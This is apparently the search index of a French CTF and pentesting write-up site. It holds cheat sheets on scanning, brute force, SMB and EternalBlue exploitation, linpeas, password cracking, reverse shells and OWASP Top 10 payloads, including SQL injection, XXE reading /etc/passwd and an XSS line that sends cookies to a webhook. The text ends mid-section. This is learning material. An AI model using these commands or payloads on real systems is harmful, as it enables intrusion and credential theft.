{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Accueil","text":""},{"location":"#redt974s-write-ups","title":"\ud83d\udcdd redt974\u2019s Write-Ups","text":"<p>Bienvenue sur ma collection de write-ups r\u00e9alis\u00e9s lors de challenges CTF et de plateformes comme Root-Me, TryHackMe, et Hack The Box.</p> <p>Ce site a pour but de : - documenter mes d\u00e9marches, m\u00e9thodes et erreurs, - partager des techniques d'exploitation (web, r\u00e9seau, binaire, etc.), - offrir une ressource p\u00e9dagogique aux d\u00e9butants comme aux passionn\u00e9s.</p>"},{"location":"#categories-disponibles","title":"\ud83d\udcc1 Cat\u00e9gories disponibles","text":"Cat\u00e9gorie Description TryHackMe TryHackMe est une plateforme en ligne gratuite pour apprendre la cybers\u00e9curit\u00e9, \u00e0 l\u2019aide d\u2019exercices pratiques et de laboratoires ! Root me Root Me est une plateforme permettant d'am\u00e9liorer ses connaissances dans le domaine de la s\u00e9curit\u00e9 informatique et du hacking \u00e0 travers des challenges."},{"location":"#outils-frequemment-utilises","title":"\ud83d\udd27 Outils fr\u00e9quemment utilis\u00e9s","text":"<ul> <li>\ud83d\udc19 Burp Suite, cURL, Gobuster</li> <li>\ud83e\uddf0 nmap, netcat, hydra, crackmapexec</li> <li>\ud83d\udc0d Python, Bash, Go, PHP pour les scripts d\u2019exploitation</li> <li>\ud83d\udc27 VM Kali Linux</li> <li>\ud83e\uddea Hashcat, John the Ripper pour le bruteforce</li> </ul>"},{"location":"#a-propos","title":"\ud83d\udcac \u00c0 propos","text":"<p>Je suis passionn\u00e9 par la cybers\u00e9curit\u00e9 offensive, et ce projet me permet de garder une trace technique de mes progr\u00e8s tout en partageant ce que j\u2019apprends.</p> <p>\u26a0\ufe0f Tous les contenus sont fournis \u00e0 but \u00e9ducatif uniquement.</p>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/","title":"Attaque d'une Machine","text":"<p>Bienvenue dans cette collection de fichiers Markdown d\u00e9di\u00e9s au pentesting. Chaque fichier couvre un sujet sp\u00e9cifique : un outil, une attaque ou une technique.</p>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#liste-des-fichiers-disponibles","title":"\ud83d\udccc Liste des fichiers disponibles","text":""},{"location":"Pentesting/Attaque%20d%27une%20Machine/#scan-et-reconnaissance","title":"\ud83d\udd0d Scan et Reconnaissance","text":"<ul> <li> <p>Nmap : Scans de ports et d\u00e9tection de services.</p> </li> <li> <p>Gobuster : Bruteforce de r\u00e9pertoires et fichiers cach\u00e9s.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#exploitation-de-services","title":"\ud83d\udcc2 Exploitation de Services","text":"<ul> <li> <p>SMB : \u00c9num\u00e9ration et exploitation du protocole SMB.</p> </li> <li> <p>Metasploit : Framework d'exploitation automatis\u00e9e.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#escalade-de-privileges","title":"\ud83d\ude80 Escalade de Privil\u00e8ges","text":"<ul> <li> <p>LinPEAS : Recherche de failles post-exploitation.</p> </li> <li> <p>SUID &amp; Capabilities : Contournement des restrictions avec des fichiers SUID.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#cracking-hashing","title":"\ud83d\udd10 Cracking &amp; Hashing","text":"<ul> <li> <p>John the Ripper : Cracking de mots de passe.</p> </li> <li> <p>Hashcat : Attaques sur les hashes de mots de passe.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#attaques-web","title":"\ud83c\udf10 Attaques Web","text":"<ul> <li> <p>OWASP Top 10 : Liste des vuln\u00e9rabilit\u00e9s web les plus critiques.</p> </li> <li> <p>SQL Injection : Exploitation des bases de donn\u00e9es vuln\u00e9rables.</p> </li> <li> <p>XSS : Ex\u00e9cution de scripts malveillants.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#reverse-shells-post-exploitation","title":"\ud83c\udfad Reverse Shells &amp; Post-Exploitation","text":"<ul> <li> <p>Reverse Shells : Commandes pour obtenir un shell distant.</p> </li> <li> <p>Privilege Escalation : Techniques d'\u00e9l\u00e9vation de privil\u00e8ges.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#steganographie-analyse-forensic","title":"\ud83d\udd0e St\u00e9ganographie &amp; Analyse Forensic","text":"<ul> <li> <p>Steghide : Cacher des fichiers dans des images.</p> </li> <li> <p>Exiftool : Analyse des m\u00e9tadonn\u00e9es de fichiers multim\u00e9dias.</p> </li> </ul>"},{"location":"Pentesting/Attaque%20d%27une%20Machine/#ressources-externes","title":"\ud83d\udcda Ressources externes","text":"<ul> <li> <p>HackTricks</p> </li> <li> <p>GTFOBins</p> </li> <li> <p>PayloadAllTheThings</p> </li> </ul>"},{"location":"Pentesting/Pentesting/","title":"Pentesting","text":""},{"location":"Pentesting/Pentesting/#1-scan-et-reconnaissance","title":"1. Scan et reconnaissance","text":""},{"location":"Pentesting/Pentesting/#nmap","title":"Nmap","text":""},{"location":"Pentesting/Pentesting/#scan-standard","title":"Scan standard","text":"<pre><code>sudo nmap -sC -sV -p- &lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#scan-leger-soft","title":"Scan l\u00e9ger (soft)","text":"<pre><code>sudo nmap -sV -O -p 1-1000 --version-light &lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#scan-avance-hard","title":"Scan avanc\u00e9 (hard)","text":"<pre><code>sudo nmap -A -p- --script=vuln &lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#gobuster-bruteforce-de-repertoires","title":"Gobuster (Bruteforce de r\u00e9pertoires)","text":"<pre><code>gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirb/big.txt -x php,html\n</code></pre>"},{"location":"Pentesting/Pentesting/#hydra-bruteforce-dauthentification","title":"Hydra (Bruteforce d'authentification)","text":""},{"location":"Pentesting/Pentesting/#ssh","title":"SSH","text":"<pre><code>hydra -l &lt;nom_utilisateur&gt; -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#2-exploitation-de-smb","title":"2. Exploitation de SMB","text":"<p>SMB (Server Message Block) est un protocole r\u00e9seau utilis\u00e9 pour le partage de fichiers et imprimantes, fonctionnant sur les ports <code>139</code> et <code>445</code>.</p>"},{"location":"Pentesting/Pentesting/#enumeration-smb","title":"Enum\u00e9ration SMB","text":""},{"location":"Pentesting/Pentesting/#avec-smbclient","title":"Avec <code>smbclient</code>","text":"<pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre>"},{"location":"Pentesting/Pentesting/#avec-enum4linux","title":"Avec <code>enum4linux</code>","text":"<pre><code>enum4linux -a &lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#acces-aux-partages-smb","title":"Acc\u00e8s aux partages SMB","text":"<pre><code>smbclient //&lt;IP&gt;/&lt;partage&gt; -U &lt;utilisateur&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#recherche-de-vulnerabilites-smb","title":"Recherche de vuln\u00e9rabilit\u00e9s SMB","text":"<pre><code>sudo nmap --script smb-vuln* -p 139,445 &lt;IP&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#exploitation-avec-metasploit","title":"Exploitation avec Metasploit","text":"<pre><code>use exploit/windows/smb/ms17_010_eternalblue\nset RHOST &lt;IP&gt;\nexploit\n</code></pre>"},{"location":"Pentesting/Pentesting/#3-escalade-de-privileges","title":"3. Escalade de privil\u00e8ges","text":""},{"location":"Pentesting/Pentesting/#recherche-de-fichiers-avec-le-bit-suid","title":"Recherche de fichiers avec le bit SUID","text":"<pre><code>find / -type f -perm -4000 2&gt;/dev/null\n</code></pre>"},{"location":"Pentesting/Pentesting/#utilisation-de-linpeas","title":"Utilisation de <code>linpeas</code>","text":""},{"location":"Pentesting/Pentesting/#telechargement-et-execution","title":"T\u00e9l\u00e9chargement et ex\u00e9cution","text":"<pre><code>wget https://github.com/peass-ng/PEASS-ng/releases/download/20240915-f58aa30b/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre>"},{"location":"Pentesting/Pentesting/#execution-depuis-une-machine-distante","title":"Ex\u00e9cution depuis une machine distante","text":"<p>Sur la machine attaquante :</p> <pre><code>python3 -m http.server 8000\n</code></pre> <p>Sur la machine cible :</p> <pre><code>cd /tmp\nwget http://&lt;IP&gt;:8000/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre>"},{"location":"Pentesting/Pentesting/#4-cracking-de-mots-de-passe","title":"4. Cracking de mots de passe","text":""},{"location":"Pentesting/Pentesting/#john-the-ripper-ssh-key-password","title":"John the Ripper (SSH Key Password)","text":""},{"location":"Pentesting/Pentesting/#conversion-de-la-cle-ssh","title":"Conversion de la cl\u00e9 SSH","text":"<pre><code>/usr/share/john/ssh2john.py &lt;chemin_vers_ta_cl\u00e9&gt; &gt; hash_john.txt\n</code></pre>"},{"location":"Pentesting/Pentesting/#cracking-du-hash","title":"Cracking du hash","text":"<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash_john.txt\n</code></pre>"},{"location":"Pentesting/Pentesting/#affichage-du-mot-de-passe-trouve","title":"Affichage du mot de passe trouv\u00e9","text":"<pre><code>john --show hash_john.txt\n</code></pre>"},{"location":"Pentesting/Pentesting/#hashcat","title":"Hashcat","text":"<pre><code>hashcat -a 0 -m &lt;ID-Algo&gt; hash.txt -o cracked.txt /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"Pentesting/Pentesting/#5-reverse-shell","title":"5. Reverse Shell","text":""},{"location":"Pentesting/Pentesting/#reverse-shell-php","title":"Reverse Shell PHP","text":"<pre><code>wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\n</code></pre>"},{"location":"Pentesting/Pentesting/#amelioration-du-terminal","title":"Am\u00e9lioration du terminal","text":""},{"location":"Pentesting/Pentesting/#transformer-en-tty-interactif","title":"Transformer en TTY interactif","text":"<pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre>"},{"location":"Pentesting/Pentesting/#passage-en-mode-raw","title":"Passage en mode raw","text":"<pre><code>stty raw -echo\n</code></pre>"},{"location":"Pentesting/Pentesting/#adaptation-du-terminal","title":"Adaptation du terminal","text":"<pre><code>export TERM=xterm\n</code></pre>"},{"location":"Pentesting/Pentesting/#ressources-supplementaires","title":"Ressources suppl\u00e9mentaires","text":"<ul> <li> <p>Reverse Shell Cheat Sheet</p> </li> <li> <p>RevShells</p> </li> </ul>"},{"location":"Pentesting/Pentesting/#6-recherche-de-fichiers","title":"6. Recherche de fichiers","text":"<pre><code>find / -type f -name \"&lt;nom-fichier&gt;\" 2&gt;/dev/null\n</code></pre>"},{"location":"Pentesting/Pentesting/#7-lancer-un-serveur-http","title":"7. Lancer un serveur HTTP","text":"<pre><code>python3 -m http.server 8000\n</code></pre>"},{"location":"Pentesting/Pentesting/#8-steganographie","title":"8. St\u00e9ganographie","text":""},{"location":"Pentesting/Pentesting/#steghide","title":"Steghide","text":""},{"location":"Pentesting/Pentesting/#cacher-un-fichier-dans-une-image","title":"Cacher un fichier dans une image","text":"<pre><code>steghide embed -cf image.jpg -ef secret.txt -p password\n</code></pre>"},{"location":"Pentesting/Pentesting/#extraire-un-fichier-cache","title":"Extraire un fichier cach\u00e9","text":"<pre><code>steghide extract -sf image.jpg -p password\n</code></pre>"},{"location":"Pentesting/Pentesting/#exiftool-metadonnees","title":"Exiftool (m\u00e9tadonn\u00e9es)","text":"<pre><code>exiftool image.jpg\n</code></pre>"},{"location":"Pentesting/Pentesting/#binwalk-analyse-de-fichiers-binaires","title":"Binwalk (analyse de fichiers binaires)","text":"<pre><code>binwalk -e image.jpg\n</code></pre>"},{"location":"Pentesting/Pentesting/#outguess","title":"Outguess","text":""},{"location":"Pentesting/Pentesting/#cacher-un-fichier","title":"Cacher un fichier","text":"<pre><code>outguess -k \"password\" -d secret.txt image.jpg output.jpg\n</code></pre>"},{"location":"Pentesting/Pentesting/#extraire-un-fichier","title":"Extraire un fichier","text":"<pre><code>outguess -k \"password\" -r output.jpg secret.txt\n</code></pre>"},{"location":"Pentesting/Pentesting/#9-exploitation-web","title":"9. Exploitation Web","text":""},{"location":"Pentesting/Pentesting/#injection-sql","title":"Injection SQL","text":""},{"location":"Pentesting/Pentesting/#input-box-non-string","title":"Input Box Non-String","text":"<pre><code>1\u00a0or\u00a01=1-- -\n</code></pre>"},{"location":"Pentesting/Pentesting/#input-box-string","title":"Input Box String","text":"<pre><code>1'\u00a0or\u00a0'1'='1'-- -\n</code></pre>"},{"location":"Pentesting/Pentesting/#injection-xss","title":"Injection XSS","text":""},{"location":"Pentesting/Pentesting/#classique","title":"Classique","text":"<pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#redirection","title":"Redirection","text":"<pre><code>&lt;script&gt;window.location.href=\"{tonlienwebhook&amp;var}\".concat(document.cookie)&lt;/script&gt;\n</code></pre>"},{"location":"Pentesting/Pentesting/#10-outils-kali-linux","title":"10. Outils Kali Linux","text":"<ul> <li> <p>Burp Suite : Interception des requ\u00eates HTTP.</p> </li> <li> <p>Sqlmap : D\u00e9tection et exploitation des injections SQL.</p> </li> <li> <p>Metasploit : Exploitation automatique de vuln\u00e9rabilit\u00e9s.</p> </li> <li> <p>Nikto : Scan des failles web.</p> </li> <li> <p>Dirb : Recherche de r\u00e9pertoires cach\u00e9s.</p> </li> </ul>"},{"location":"Pentesting/Pentesting/#11-ressources-utiles","title":"11. Ressources utiles","text":"<ul> <li> <p>HackTricks</p> </li> <li> <p>OWASP</p> </li> <li> <p>NIST</p> </li> <li> <p>MITRE ATT&amp;CK\u00ae</p> </li> <li> <p>Clusif</p> </li> <li> <p>CVE</p> </li> </ul> <p></p>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/","title":"OWASP Top 10   Cheat Sheet (2017)","text":"<p>L'OWASP Top 10 est une classification des vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9 les plus critiques dans les applications web. Voici une liste compl\u00e8te avec des exemples d'attaques, des outils de test, et des commandes pour chaque type de vuln\u00e9rabilit\u00e9.</p>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#1-injection-sql-sqli","title":"1. Injection SQL (SQLi)","text":"<p>L'injection SQL permet d'ex\u00e9cuter des requ\u00eates arbitraires sur une base de donn\u00e9es.</p> <p>Exemple d'attaque :</p> <pre><code>' OR '1'='1' --\n</code></pre> <p>Outils de test :</p> <pre><code>sqlmap -u \"http://site.com/login.php?id=1\" --dump\n</code></pre> <ul> <li>Dump complet de la base de donn\u00e9es.</li> </ul> <pre><code>sqlmap -u \"http://site.com/login.php?id=1\" --dbs\n</code></pre> <ul> <li>Liste des bases de donn\u00e9es.</li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#2-authentification-brisee","title":"2. Authentification Bris\u00e9e","text":"<p>Mauvaise gestion des sessions et mots de passe permettant l'usurpation d'identit\u00e9.</p> <p>Exemple d'attaque :</p> <ul> <li> <p>Utilisation de mots de passe faibles.</p> </li> <li> <p>Vol de session via un cookie non prot\u00e9g\u00e9.</p> </li> </ul> <p>Outils de test :</p> <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=Incorrect\"\n</code></pre> <ul> <li>Brute force sur formulaire de connexion.</li> </ul> <pre><code>jwt-tool \"&lt;token&gt;\" -C\n</code></pre> <ul> <li>Manipulation de tokens JWT.</li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#3-exposition-de-donnees-sensibles","title":"3. Exposition de Donn\u00e9es Sensibles","text":"<p>Donn\u00e9es personnelles ou mots de passe stock\u00e9s sans chiffrement.</p> <p>Test avec Curl :</p> <pre><code>curl -X GET \"http://site.com/api/userinfo\" -H \"Authorization: Bearer &lt;token&gt;\"\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#4-attaque-xxe-xml-external-entities","title":"4. Attaque XXE (XML External Entities)","text":"<p>L'exploitation d'une mauvaise configuration XML pour acc\u00e9der \u00e0 des fichiers.</p> <p>Exemple de payload :</p> <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n</code></pre> <p>Outils de test :</p> <pre><code>curl -X POST -d \"&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;\" http://site.com/vulnerable\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#5-controle-dacces-brise","title":"5. Contr\u00f4le d'Acc\u00e8s Bris\u00e9","text":"<p>Acc\u00e8s non autoris\u00e9 \u00e0 des ressources restreintes.</p> <p>Test avec Curl :</p> <pre><code>curl -X GET \"http://site.com/admin\" -b \"sessionid=xyz\"\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#6-mauvaise-configuration-de-securite","title":"6. Mauvaise Configuration de S\u00e9curit\u00e9","text":"<p>Mauvaise gestion des permissions, services expos\u00e9s inutilement.</p> <p>Scan avec Nmap :</p> <pre><code>nmap -A -p- --script=vuln site.com\n</code></pre> <ul> <li>Scan complet pour d\u00e9tecter les services vuln\u00e9rables.</li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#7-cross-site-scripting-xss","title":"7. Cross-Site Scripting (XSS)","text":"<p>Injection de scripts malveillants dans des pages web.</p> <p>Exemple de payload :</p> <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre> <p>Outils de test :</p> <ul> <li> <p>Burp Suite : Modification des requ\u00eates HTTP pour tester l'injection.</p> </li> <li> <p>XSS Hunter : Outil avanc\u00e9 pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s XSS.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#8-deserialisation-insecure","title":"8. D\u00e9s\u00e9rialisation Insecure","text":"<p>Exploitation d'objets s\u00e9rialis\u00e9s pour ex\u00e9cuter du code malveillant.</p> <p>Exemple d'attaque PHP :</p> <pre><code>O:4:\"Test\":1:{s:4:\"data\";s:12:\"Malicious Code\";}\n</code></pre> <p>Outils de test :</p> <pre><code>ysoSerial &lt;payload&gt;\n</code></pre> <ul> <li>G\u00e9n\u00e9ration de payloads d\u00e9s\u00e9rialis\u00e9s pour Java.</li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#9-utilisation-de-composants-vulnerables","title":"9. Utilisation de Composants Vuln\u00e9rables","text":"<p>D\u00e9pendances logicielles obsol\u00e8tes et exploitables.</p> <p>Scan de vuln\u00e9rabilit\u00e9s :</p> <pre><code>nmap --script http-vuln* -p 80 site.com\n</code></pre> <p>Outils additionnels :</p> <ul> <li> <p>Dependency-Check : Scanner des d\u00e9pendances pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s connues.</p> </li> <li> <p>Retire.js : D\u00e9tection de librairies JavaScript vuln\u00e9rables.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282017%29/#10-surveillance-et-journalisation-insuffisantes","title":"10. Surveillance et Journalisation Insuffisantes","text":"<p>Absence de logs permettant la d\u00e9tection d'attaques.</p> <p>Outils de monitoring :</p> <ul> <li> <p>Wazuh (SIEM Open Source)</p> </li> <li> <p>Splunk</p> </li> <li> <p>ELK Stack (Elasticsearch, Logstash, Kibana)</p> </li> </ul> <p>Exemple de configuration Elasticsearch :</p> <pre><code>curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty'\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/","title":"OWASP Top 10   Cheat Sheet (2021)","text":"<p>L'OWASP Top 10  est une classification des vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9 les plus critiques dans les applications web. Voici une liste compl\u00e8te avec des exemples d'attaques, des outils de test, et des commandes pour chaque type de vuln\u00e9rabilit\u00e9, bas\u00e9e sur la version 2021.</p>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#1-controle-dacces-non-securise-broken-access-control","title":"1. Contr\u00f4le d'acc\u00e8s non s\u00e9curis\u00e9 (Broken Access Control)","text":"<p>Les utilisateurs peuvent acc\u00e9der \u00e0 des fonctions ou donn\u00e9es non autoris\u00e9es.</p> <p>Exemple d'attaque :</p> <pre><code>curl -X GET \"http://site.com/admin\" -b \"sessionid=xyz\"\n</code></pre> <p>Outils de test :</p> <ul> <li> <p>Burp Suite : Modification des requ\u00eates HTTP pour contourner les contr\u00f4les d'acc\u00e8s.</p> </li> <li> <p>Fuzzing : Envoi de requ\u00eates inattendues pour d\u00e9couvrir des failles.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#2-cryptographie-inadequate-cryptographic-failures","title":"2. Cryptographie Inad\u00e9quate (Cryptographic Failures)","text":"<p>Mauvaise protection des donn\u00e9es sensibles par chiffrement insuffisant ou inappropri\u00e9.</p> <p>Test avec Curl :</p> <pre><code>curl -X GET \"http://site.com/api/userinfo\" -H \"Authorization: Bearer &lt;token&gt;\"\n</code></pre> <p>Outils de test :</p> <ul> <li> <p>TestSSLServer : Analyse SSL/TLS d'un serveur web.</p> </li> <li> <p>OpenSSL : Test manuel de configurations SSL/TLS.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#3-injection","title":"3. Injection","text":"<p>L'injection permet d'ex\u00e9cuter des commandes arbitraires sur un syst\u00e8me cible.</p> <p>Exemple d'attaque :</p> <pre><code>' OR '1'='1' --\n</code></pre> <p>Outils de test :</p> <pre><code>sqlmap -u \"http://site.com/login.php?id=1\" --dump\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#4-conception-insecure-insecure-design","title":"4. Conception Insecure (Insecure Design)","text":"<p>Manque de contr\u00f4le de s\u00e9curit\u00e9 d\u00e8s la phase de conception.</p> <p>Outils de test :</p> <ul> <li> <p>Threat Modeling : OWASP Threat Dragon.</p> </li> <li> <p>Analyse de conception par revue manuelle.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#5-mauvaise-configuration-de-securite","title":"5. Mauvaise Configuration de S\u00e9curit\u00e9","text":"<p>Mauvaise gestion des permissions, services expos\u00e9s inutilement.</p> <p>Scan avec Nmap :</p> <pre><code>nmap -A -p- --script=vuln site.com\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#6-vulnerabilite-et-integrite-des-composants-vulnerable-and-outdated-components","title":"6. Vuln\u00e9rabilit\u00e9 et int\u00e9grit\u00e9 des composants (Vulnerable and Outdated Components)","text":"<p>Utilisation de composants obsol\u00e8tes ou vuln\u00e9rables.</p> <p>Scan de vuln\u00e9rabilit\u00e9s :</p> <pre><code>nmap --script http-vuln* -p 80 site.com\n</code></pre> <p>Outils additionnels :</p> <ul> <li> <p>Dependency-Check : Scanner des d\u00e9pendances pour d\u00e9tecter les vuln\u00e9rabilit\u00e9s connues.</p> </li> <li> <p>Retire.js : D\u00e9tection de librairies JavaScript vuln\u00e9rables.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#7-identification-et-authentification-manquantes-ou-defaillantes-identification-and-authentication-failures","title":"7. Identification et Authentification Manquantes ou D\u00e9faillantes (Identification and Authentication Failures)","text":"<p>Probl\u00e8mes dans la gestion de l'identit\u00e9 des utilisateurs.</p> <p>Outils de test :</p> <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=Incorrect\"\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#8-faille-de-securite-logicielle-software-and-data-integrity-failures","title":"8. Faille de S\u00e9curit\u00e9 Logicielle (Software and Data Integrity Failures)","text":"<p>Absence de m\u00e9canismes pour v\u00e9rifier l'int\u00e9grit\u00e9 du code et des donn\u00e9es.</p> <p>Outils de test :</p> <ul> <li> <p>Hashcat : V\u00e9rification d'int\u00e9grit\u00e9 par hachage.</p> </li> <li> <p>Burp Suite : Manipulation de donn\u00e9es pour tester l'int\u00e9grit\u00e9.</p> </li> </ul>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#9-deserialisation-insecure","title":"9. D\u00e9s\u00e9rialisation Insecure","text":"<p>Exploitation d'objets s\u00e9rialis\u00e9s pour ex\u00e9cuter du code malveillant.</p> <p>Exemple d'attaque PHP :</p> <pre><code>O:4:\"Test\":1:{s:4:\"data\";s:12:\"Malicious Code\";}\n</code></pre> <p>Outils de test :</p> <pre><code>ysoSerial &lt;payload&gt;\n</code></pre>"},{"location":"Pentesting/OWASP/OWASP%20Top%2010%20-%20Cheat%20Sheet%20%282021%29/#10-surveillance-et-journalisation-insuffisantes-security-logging-and-monitoring-failures","title":"10. Surveillance et Journalisation Insuffisantes (Security Logging and Monitoring Failures)","text":"<p>Absence de logs permettant la d\u00e9tection d'attaques.</p> <p>Outils de monitoring :</p> <ul> <li> <p>Wazuh (SIEM Open Source)</p> </li> <li> <p>Splunk</p> </li> <li> <p>ELK Stack (Elasticsearch, Logstash, Kibana)</p> </li> </ul> <p>Exemple de configuration Elasticsearch :</p> <pre><code>curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty'\n</code></pre>"},{"location":"Pentesting/Outils/Nmap/","title":"Nmap","text":""},{"location":"Pentesting/Outils/Nmap/#host-discovery","title":"Host Discovery :","text":"<ul> <li>Scan en couche 2 (ARP)</li> </ul> <p><pre><code>nmap -PR -sn 10.0.2.0/24\n</code></pre> - Scan en couche 3 (ICMP)</p> <pre><code>sudo nmap -PE -sn 10.0.2.0/24 ## ICMP Echo (Test de connectivit\u00e9) \n</code></pre> <pre><code>sudo nmap -PP -sn 10.0.2.0/24 ## ICMP Timestamps (Synchronisation d\u2019horloge des routeurs) \n</code></pre> <p><pre><code>sudo nmap -PM -sn 10.0.2.0/24 ## ICMP Mask Query (D\u00e9couverte du masque du subnet local)\n</code></pre> - Scan en couche 4 (TCP/UDP)</p> <pre><code>sudo nmap -PS80,443 -sn 10.0.2.0/24 ## Simple TCP SYN (Sur les ports 80 (d\u00e9faut) et 443) \n</code></pre> <pre><code>sudo nmap -PA80 -sn 10.0.2.0/24 ## Simple TCP ACK (Sur le port 80 (d\u00e9faut)) \n</code></pre> <pre><code>sudo nmap -PU -sn 10.0.2.0/24 ## Simple UDP Datagram (Expecting ICMP Reponse)\n</code></pre>"},{"location":"Pentesting/Outils/Nmap/#port-scanning","title":"Port Scanning :","text":"<ul> <li>R\u00e9cup\u00e9ration des port ouverts :</li> </ul> <pre><code>nmap -p- 10.0.2.4 ## Simple TCP scan (All ports) \n</code></pre> <pre><code>nmap -F 10.0.2.4 ## Scan rapide (limit\u00e9 aux ports bien connus)\n</code></pre> <pre><code>nmap -p- -r 10.0.2.4 ## Simple TCP scan (scan des ports dans l\u2019ordre) \n</code></pre> <p><pre><code>nmap -p80 10.0.2.4 ## Simple TCP scan (port sp\u00e9cifique)\n</code></pre> - R\u00e9cup\u00e9ration des versions de services :</p> <p><pre><code>sudo nmap -p- -sV 10.0.2.4\n</code></pre> - Scan de vuln\u00e9rabilit\u00e9 :</p> <pre><code>sudo nmap -sV -p21 -script vuln 10.0.2.4\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/","title":"SqlMAP","text":"<p>Voici une liste de commandes SQLMap adapt\u00e9es \u00e0 diff\u00e9rents sc\u00e9narios d'attaques SQL sur un serveur web :</p>"},{"location":"Pentesting/Outils/SqlMAP/#detection-et-identification","title":"\ud83d\udd0d D\u00e9tection et Identification","text":""},{"location":"Pentesting/Outils/SqlMAP/#tester-une-url-vulnerable-a-linjection-sql","title":"Tester une URL vuln\u00e9rable \u00e0 l'injection SQL :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php?id=1\" --batch --dbs\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#detection-avec-post-data","title":"D\u00e9tection avec POST data :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php\" --data \"username=admin&amp;password=test\" --batch --dbs\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#detection-avec-cookie","title":"D\u00e9tection avec Cookie :","text":"<pre><code>sqlmap -u \"http://192.168.56.102/login.php\" --cookie=\"PHPSESSID=abcd1234\" --batch --dbs\n</code></pre>"},{"location":"Pentesting/Outils/SqlMAP/#recuperation-dinformations","title":"\ud83d\udccc R\u00e9cup\u00e9ration 